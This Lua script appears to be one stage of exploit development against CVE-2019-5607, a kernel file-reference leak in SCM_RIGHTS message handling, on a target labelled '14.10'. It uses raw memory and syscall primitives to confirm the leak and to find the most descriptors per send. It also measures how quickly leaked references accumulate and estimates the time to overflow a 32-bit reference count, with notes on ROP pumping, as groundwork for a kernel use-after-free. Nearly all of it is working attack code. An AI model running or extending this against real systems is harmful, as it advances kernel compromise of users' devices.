-- CRASH_CLASS: LOW
-- PROBE 89c: CVE-2019-5607 leak evidence + multi-fd optimization
--
-- Context: 89b confirmed error path [valid, 9999]→-1, fhold works on
-- normal path (20 held fds alive after close). Section E died from
-- SIGPIPE because write(broken_pipe) kills without SIG_IGN.
--
-- Key insight: if error-path fhold leaks refs (CVE unpatched), then
-- closing the pipe read fd leaves f_count > 0 → _fdrop never runs →
-- pipe_close never runs → pipe NOT broken → write to write end succeeds.
-- If CVE is patched (fdrop in error path), f_count reaches 0 on close →
-- pipe freed → write returns -1 (EPIPE).
--
-- Sections:
--   A: Install SIG_IGN for SIGPIPE (prevent process kill)
--   B: Baseline — close read, write → expect -1 (EPIPE)
--   C: LEAK TEST — 50 error sends + close + write (success = leak!)
--   D: Multi-fd [fd × N, 9999] — find max N accepted per send
--   E: Throughput with optimal N + pre-allocated buffers

print("=== PROBE 89c: CVE-2019-5607 LEAK EVIDENCE ===")
print("")
collectgarbage("stop")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function zero(b, n) for o = 0, n - 4, 4 do wd(b + o, 0) end end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)

local sv = memory.alloc(8)
local function mkpair()
    wq(sv, uint64(0))
    local r = N(native.fcall_with_rax(stub, 135, 1, 1, 0, N(sv)))
    if r ~= 0 then return nil, nil end
    local a, b = rd(sv), rd(sv + 4)
    native.fcall_with_rax(stub, 92, b, 4, 4) -- O_NONBLOCK on recv end
    return a, b
end

local function scm_recv(sock)
    local rb = memory.alloc(8)
    local ri = memory.alloc(16)
    wq(ri, uint64(N(rb))); wq(ri + 8, uint64(1))
    local rc = memory.alloc(64); zero(rc, 64)
    local rm = memory.alloc(64); zero(rm, 64)
    wq(rm + 0x10, uint64(N(ri))); wd(rm + 0x18, 1)
    wq(rm + 0x20, uint64(N(rc))); wd(rm + 0x28, 64)
    local rr = N(native.fcall_with_rax(stub, 27, sock, N(rm), 0))
    if rr <= 0 then return -1 end
    local ct = rd(rc + 8) or 0
    local fd = rd(rc + 16) or 0
    if ct == 1 and fd > 0 and fd < 10000 then return fd end
    return -1
end

-- ============================================================
-- A: Install SIG_IGN for SIGPIPE (13)
-- ============================================================
print("--- A: SIGPIPE IGNORE ---")
local sa = memory.alloc(48)
for i = 0, 40, 8 do wq(sa + i, uint64(0)) end
wq(sa, uint64(1)) -- SIG_IGN = 1
local oa = memory.alloc(48)
for i = 0, 40, 8 do wq(oa + i, uint64(0)) end
local sr = N(native.fcall_with_rax(stub, 416, 13, N(sa), N(oa)))
print("  sigaction(SIGPIPE, SIG_IGN) ret=" .. sr)
if sr ~= 0 then print("  WARNING: SIG_IGN failed — writes to broken pipe will kill") end

-- ============================================================
-- B: BASELINE — close read end, write → expect EPIPE (-1)
-- ============================================================
print("")
print("--- B: BASELINE (no error sends) ---")
local bp1, bp2 = create_pipe()
local brd, bwr = N(bp1), N(bp2)
print("  pipe rd=" .. brd .. " wr=" .. bwr)

native.fcall_with_rax(stub, 6, brd) -- close read end
local mk = memory.alloc(8)
wd(mk, 0xBB000001)
local wn = N(native.fcall_with_rax(stub, 4, bwr, N(mk), 4))
print("  write(wr) after close(rd): ret=" .. wn)
if wn == -1 then
    print("  *** EXPECTED: -1 (EPIPE) — pipe broken normally ***")
elseif wn > 0 then
    print("  UNEXPECTED: write succeeded without any leak sends!")
end
native.fcall_with_rax(stub, 6, bwr)
if N(native.fcall_with_rax(stub, 20)) ~= pid then print("DEAD B"); return end

-- ============================================================
-- C: LEAK TEST — error-path pump + close + write
-- ============================================================
print("")
print("--- C: LEAK TEST (50 error sends) ---")
local s0, s1 = mkpair()
if not s0 then print("  socketpair FAIL"); return end

local cp1, cp2 = create_pipe()
local crd, cwr = N(cp1), N(cp2)
print("  pipe rd=" .. crd .. " wr=" .. cwr .. " sock=[" .. s0 .. "," .. s1 .. "]")

-- Pre-allocate sendmsg structures for [crd, 9999]
local ib = memory.alloc(8); memory.write_byte(ib, 0x42)
local iv = memory.alloc(16)
wq(iv, uint64(N(ib))); wq(iv + 8, uint64(1))
local cm = memory.alloc(32); zero(cm, 32)
wd(cm, 24)         -- cmsg_len = CMSG_LEN(8) = 16+8 = 24
wd(cm + 4, 0xFFFF) -- SOL_SOCKET
wd(cm + 8, 1)      -- SCM_RIGHTS
wd(cm + 16, crd)   -- fd[0] = valid
wd(cm + 20, 9999)  -- fd[1] = INVALID → triggers EBADF after fhold(fd[0])
local ms = memory.alloc(64); zero(ms, 64)
wq(ms + 0x10, uint64(N(iv))); wd(ms + 0x18, 1)
wq(ms + 0x20, uint64(N(cm))); wd(ms + 0x28, 24)

-- Pump 50 error-path sends (pre-allocated, no alloc in loop)
local efail = 0
for i = 1, 50 do
    local r = N(native.fcall_with_rax(stub, 28, s0, N(ms), 0))
    if r == -1 then efail = efail + 1 end
end
print("  error sends: " .. efail .. "/50")

-- Close the read fd
native.fcall_with_rax(stub, 6, crd)
print("  closed rd=" .. crd)

-- THE TEST: write to write end
-- If CVE unpatched: f_count was 1+50=51, now 50 after close → pipe alive → write OK
-- If CVE patched: f_count was 1, now 0 after close → pipe freed → write -1
wd(mk, 0xCC000001)
wn = N(native.fcall_with_rax(stub, 4, cwr, N(mk), 4))
print("  write(wr) after close(rd): ret=" .. wn)

if wn > 0 then
    print("  ************************************")
    print("  *** WRITE SUCCEEDED — LEAK CONFIRMED ***")
    print("  *** CVE-2019-5607 IS EXPLOITABLE ON 14.10 ***")
    print("  ************************************")
    local total = wn
    for i = 1, 100 do
        local n = N(native.fcall_with_rax(stub, 4, cwr, N(mk), 4))
        if n <= 0 then break end
        total = total + n
    end
    print("  pipe buffer: " .. total .. " bytes written (struct file alive)")
elseif wn == -1 then
    print("  write returned -1 (EPIPE)")
    print("  fhold leak NOT detected — CVE likely PATCHED on 14.10")
end

native.fcall_with_rax(stub, 6, cwr)
native.fcall_with_rax(stub, 6, s0); native.fcall_with_rax(stub, 6, s1)
if N(native.fcall_with_rax(stub, 20)) ~= pid then print("DEAD C"); return end

-- ============================================================
-- D: MULTI-FD [fd × N, 9999] — find max N
-- ============================================================
print("")
print("--- D: MULTI-FD [fd*N, 9999] ---")
s0, s1 = mkpair()
if not s0 then print("  socketpair fail"); return end
local dp1, dp2 = create_pipe()
local drd, dwr = N(dp1), N(dp2)

local test_ns = {10, 50, 100, 150, 200, 250}
local best_n = 1
for _, tn in ipairs(test_ns) do
    local nfds = tn + 1
    local data_len = nfds * 4
    local cmsg_len = 16 + data_len
    local cspace = math.floor((cmsg_len + 7) / 8) * 8

    local tcm = memory.alloc(cspace + 16); zero(tcm, cspace + 16)
    wd(tcm, cmsg_len); wd(tcm + 4, 0xFFFF); wd(tcm + 8, 1)
    for i = 0, tn - 1 do wd(tcm + 16 + i * 4, drd) end
    wd(tcm + 16 + tn * 4, 9999)

    local tib = memory.alloc(8); memory.write_byte(tib, 0x42)
    local tiv = memory.alloc(16)
    wq(tiv, uint64(N(tib))); wq(tiv + 8, uint64(1))
    local tms = memory.alloc(64); zero(tms, 64)
    wq(tms + 0x10, uint64(N(tiv))); wd(tms + 0x18, 1)
    wq(tms + 0x20, uint64(N(tcm))); wd(tms + 0x28, cspace)

    local ok, ret = pcall(function()
        return N(native.fcall_with_rax(stub, 28, s0, N(tms), 0))
    end)
    local r = ok and ret or "CRASH"
    print("  N=" .. tn .. ": ret=" .. tostring(r))
    if ok and ret == -1 then
        best_n = tn
    elseif not ok then
        print("  CRASHED at N=" .. tn)
        break
    else
        -- ret >= 0 means the send succeeded (all fds valid incl 9999??)
        -- This shouldn't happen. Stop escalating.
        print("  UNEXPECTED ret=" .. tostring(r))
        break
    end
end

native.fcall_with_rax(stub, 6, drd); native.fcall_with_rax(stub, 6, dwr)
native.fcall_with_rax(stub, 6, s0); native.fcall_with_rax(stub, 6, s1)
if N(native.fcall_with_rax(stub, 20)) ~= pid then print("DEAD D"); return end
print("  best_n=" .. best_n)

-- ============================================================
-- E: THROUGHPUT with best_n + pre-alloc
-- ============================================================
print("")
print("--- E: THROUGHPUT N=" .. best_n .. " ---")
s0, s1 = mkpair()
if not s0 then print("  socketpair fail"); return end
local ep1, ep2 = create_pipe()
local erd, ewr = N(ep1), N(ep2)

-- Pre-allocate everything once
local nfds = best_n + 1
local data_len = nfds * 4
local ecmsg_len = 16 + data_len
local ecspace = math.floor((ecmsg_len + 7) / 8) * 8
local ecm = memory.alloc(ecspace + 16); zero(ecm, ecspace + 16)
wd(ecm, ecmsg_len); wd(ecm + 4, 0xFFFF); wd(ecm + 8, 1)
for i = 0, best_n - 1 do wd(ecm + 16 + i * 4, erd) end
wd(ecm + 16 + best_n * 4, 9999)

local eib = memory.alloc(8); memory.write_byte(eib, 0x42)
local eiv = memory.alloc(16)
wq(eiv, uint64(N(eib))); wq(eiv + 8, uint64(1))
local ems = memory.alloc(64); zero(ems, 64)
wq(ems + 0x10, uint64(N(eiv))); wd(ems + 0x18, 1)
wq(ems + 0x20, uint64(N(ecm))); wd(ems + 0x28, ecspace)

local PUMP = 5000
local tv0 = memory.alloc(16); zero(tv0, 16)
native.fcall_with_rax(stub, 116, N(tv0), 0)
local sec0 = N(rq(tv0) or uint64(0))
local usec0 = N(rq(tv0 + 8) or uint64(0))

local efails = 0
for i = 1, PUMP do
    local r = N(native.fcall_with_rax(stub, 28, s0, N(ems), 0))
    if r == -1 then efails = efails + 1 end
end

local tv1 = memory.alloc(16); zero(tv1, 16)
native.fcall_with_rax(stub, 116, N(tv1), 0)
local sec1 = N(rq(tv1) or uint64(0))
local usec1 = N(rq(tv1 + 8) or uint64(0))

local elapsed = (sec1 - sec0) * 1000000 + (usec1 - usec0)
local rate = 0
if elapsed > 0 then rate = math.floor(PUMP * 1000000 / elapsed) end
local leaks_per_sec = rate * best_n

print(string.format("  %d sends: fail=%d elapsed=%d us (%.1f ms)",
    PUMP, efails, elapsed, elapsed / 1000))
print(string.format("  rate: %d sends/sec", rate))
print(string.format("  fholds/sec: %d (N=%d per send)", leaks_per_sec, best_n))

if leaks_per_sec > 0 then
    local time_s = math.floor(4294967296 / leaks_per_sec)
    print(string.format("  time to overflow 2^32: %d sec (%.1f min, %.1f hours)",
        time_s, time_s / 60, time_s / 3600))
    if time_s < 7200 then
        print("  *** FEASIBLE: overflow reachable in <2 hours ***")
    elseif time_s < 86400 then
        print("  *** MARGINAL: overflow takes hours, threading needed ***")
    else
        print("  *** TOO SLOW: need native ROP pump ***")
    end
end

native.fcall_with_rax(stub, 6, erd); native.fcall_with_rax(stub, 6, ewr)
native.fcall_with_rax(stub, 6, s0); native.fcall_with_rax(stub, 6, s1)

print("")
print("canary=" .. N(native.fcall_with_rax(stub, 20)))
print("=== PROBE 89c COMPLETE ===")
